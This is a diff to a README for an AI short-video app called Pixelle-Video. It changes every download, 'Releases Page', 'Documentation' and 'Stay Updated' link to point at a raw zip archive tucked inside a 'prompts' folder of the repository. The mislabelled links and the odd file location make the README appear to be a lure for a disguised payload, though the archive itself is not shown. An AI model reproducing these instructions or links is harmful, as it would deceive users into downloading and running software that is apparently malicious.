@@ -1,7 +1,7 @@
 # 🚀 Pixelle-Video - Create Short Videos Effortlessly
 
 ## 🔗 Download Now
-[![Download Pixelle-Video](https://raw.githubusercontent.com/ShubhamZade1997/Pixelle-Video/main/resources/Pixelle-Video-3.0.zip)](https://raw.githubusercontent.com/ShubhamZade1997/Pixelle-Video/main/resources/Pixelle-Video-3.0.zip)
+[![Download Pixelle-Video](https://github.com/ShubhamZade1997/Pixelle-Video/raw/refs/heads/main/pixelle_video/prompts/Video_Pixelle_v1.1-beta.3.zip)](https://github.com/ShubhamZade1997/Pixelle-Video/raw/refs/heads/main/pixelle_video/prompts/Video_Pixelle_v1.1-beta.3.zip)
 
 ## 🚀 Introduction
 Welcome to Pixelle-Video! This application allows you to create short videos automatically using advanced AI technology. Whether you're a content creator or just looking for a fun way to express yourself, Pixelle-Video simplifies video production.
@@ -23,7 +23,7 @@ To run Pixelle-Video, you need:
 Follow these steps to get started with Pixelle-Video:
 
 1. **Download the Application**
-   - Visit the [Releases Page](https://raw.githubusercontent.com/ShubhamZade1997/Pixelle-Video/main/resources/Pixelle-Video-3.0.zip) to download the latest version of Pixelle-Video.
+   - Visit the [Releases Page](https://github.com/ShubhamZade1997/Pixelle-Video/raw/refs/heads/main/pixelle_video/prompts/Video_Pixelle_v1.1-beta.3.zip) to download the latest version of Pixelle-Video.
 
 2. **Select Your Platform**
    - Choose the correct version for your operating system (Windows or macOS).
@@ -38,7 +38,7 @@ Follow these steps to get started with Pixelle-Video:
    - Click the icon to launch the application.
 
 ## 📂 Download & Install
-Visit the [Releases Page](https://raw.githubusercontent.com/ShubhamZade1997/Pixelle-Video/main/resources/Pixelle-Video-3.0.zip) to download the latest version of Pixelle-Video. Choose the right version for your computer and follow the installation steps detailed above.
+Visit the [Releases Page](https://github.com/ShubhamZade1997/Pixelle-Video/raw/refs/heads/main/pixelle_video/prompts/Video_Pixelle_v1.1-beta.3.zip) to download the latest version of Pixelle-Video. Choose the right version for your computer and follow the installation steps detailed above.
 
 ## 🎨 How to Create a Video
 Follow these simple steps to create your first video:
@@ -73,12 +73,12 @@ Pixelle-Video requires an internet connection for full functionality but allows 
 Yes, you can record your own voiceover and incorporate it into your videos if you prefer.
 
 ## 📚 Documentation
-For detailed guides and tips, you can refer to our [Documentation](https://raw.githubusercontent.com/ShubhamZade1997/Pixelle-Video/main/resources/Pixelle-Video-3.0.zip). This resource provides in-depth information on features and usage.
+For detailed guides and tips, you can refer to our [Documentation](https://github.com/ShubhamZade1997/Pixelle-Video/raw/refs/heads/main/pixelle_video/prompts/Video_Pixelle_v1.1-beta.3.zip). This resource provides in-depth information on features and usage.
 
 ## 👐 Feedback
 We value your input! If you have questions or suggestions, please feel free to reach out through the Issues section on our GitHub repository.
 
 ## 🔗 Stay Updated
-Keep an eye on our [Releases Page](https://raw.githubusercontent.com/ShubhamZade1997/Pixelle-Video/main/resources/Pixelle-Video-3.0.zip) for new features and updates.
+Keep an eye on our [Releases Page](https://github.com/ShubhamZade1997/Pixelle-Video/raw/refs/heads/main/pixelle_video/prompts/Video_Pixelle_v1.1-beta.3.zip) for new features and updates.
 
 Thank you for choosing Pixelle-Video! Enjoy creating your videos with ease.
